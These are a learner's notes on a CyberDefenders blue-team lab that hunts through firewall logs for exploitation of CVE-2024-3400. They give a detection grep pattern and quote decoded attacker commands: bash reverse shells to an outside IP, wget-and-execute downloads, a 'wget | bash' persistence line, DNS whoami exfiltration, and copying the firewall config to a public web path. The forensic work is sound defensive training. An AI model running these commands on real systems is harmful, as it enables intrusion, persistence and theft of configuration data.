PaloAltoRCE Lab (CyberDefenders)

Hello these are my notes taken while solving the lab, not a polished writeup. I was practicing for the ECIR exam at the time and plan to revisit the lab to add screenshots and turn this into a full write-up in the future.

Scenario

Palo Alto, a leading firewall vendor, has recently announced a critical vulnerability (CVE-2024-3400) that affects specific versions of its next-generation firewalls. This critical vulnerability enables remote attackers to gain unauthorized access and potentially take full control of affected systems. These firewalls are integral to your organization's network security, as they manage and monitor both inbound and outbound traffic, safeguarding against unauthorized access and various threats.

As a security analyst, your primary task is to accurately and swiftly determine whether any of the organization's systems are impacted by this newly disclosed vulnerability.

https://cyberdefenders.org/blueteam-ctf-challenges/paloaltorce/

Log Analysis & Initial Search

  • Log Volume:

Received 2.2 million logs.

  • Search Approach:

Searched using the CVE to find related information on GitHub, ExploitDB, and other sources. Found useful details on the Palo Alto Networks security page for CVE-2024-3400.

  • Key Information Found:

The PAN-OS CLI command to detect attempted exploit activity:

``jsx grep pattern "failed to unmarshal session(.\+.\/" mp-log gpsvc.log ``

If the value between “session(“ and “)” is not a GUID and instead contains a file system path or embedded shell commands, it could indicate an attempted exploitation of CVE-2024-3400.

  • Log Query:

Searched with:

``jsx message:"failed to unmarshal" ``

This returned 101 hits. Some were benign (with GUIDs), while others contained Base64-encoded shell commands.

Decoding the Base64 Commands

Using CyberChef, several Base64-encoded commands were decoded, revealing multiple malicious activities:

  • Reverse Shell Attempts:
    • bash -i >& /dev/tcp/54.162.164.22/1337 0>&1

      • Opens a reverse shell to 54.162.164.22 on port 1337.

    • bash -i >& /dev/tcp/54.162.164.22/13337 0>&1

      • Similar reverse shell on port 13337.

    • /dev/tcp/54.162.164.22/8080 0>&1

      • Another reverse shell attempt to port 8080.

  • Remote Script Execution:
    • A command (with parts encoded) that downloads and executes a script from a remote server at 138.197.162.79 on port 65534.
  • Malicious File Download:
    • wget -qO /var/tmp/BYhkpzVZP http://185.196.9.31:8080/ZvfhsodEot2FHKdyoKI6_w; chmod +x /var/tmp/BYhkpzVZP; /var/tmp/BYhkpzVZP &

      • Downloads a malicious file, makes it executable, and runs it in the background.

  • Exfiltration of a Configuration File:
    • cp /opt/pancfg/mgmt/saved-configs/running-config.xml /var/appweb/sslvpndocs/global-protect/gpvpncfg.css

      • Copies a sensitive config file to a publicly accessible location, disguising it as gpvpncfg.css.

  • Reconnaissance and Data Exfiltration:
    • nslookup uktmhf.dnslog.cn/whoami``

      • Sends the output of whoami (current user) to an external DNS logging service.

    • whoami >& /dev/tcp/54.162.164.22/8080 0>&1

      • Sends the current username to the attacker’s IP via a network connection.

Attacker Identification

Based on the decoded commands, it is 100% clear that the attacker’s IP is:

54.162.164.22

Persistence Mechanism

The attack utilizes standard tools to maintain persistence:

  • cron:

    • A time-based job scheduler in Linux, used to automate tasks.

  • wget:

    • Used for downloading files.

A specific persistence command was found in the logs:

jsx
wget -qO- http://54.162.164.22/update | bash

This command downloads and executes a remote script, which may modify system startup files, add cron jobs, or install a backdoor.

Exfiltration of Sensitive Data

One key exfiltration command discovered:

jsx
cp /opt/pancfg/mgmt/saved-configs/running-config.xml /var/appweb/sslvpndocs/global-protect/gpvpncfg.css

This command copies the sensitive file running-config.xml to a publicly accessible web directory and disguises it as gpvpncfg.css to evade detection.

Answer:

The file exfiltrated is running-config.xml.

Accessing the Exfiltrated Content

The blog post describing the exfiltration indicates that the attacker accessed the data through a file named bootstrap.min.css. By searching for GET requests involving the attacker’s IP, the following full URL was identified:

jsx
https://44.217.16.42/global-protect/bootstrap.min.css

Answer:

The full URL used to access the exfiltrated content is https://44.217.16.42/global-protect/bootstrap.min.css.
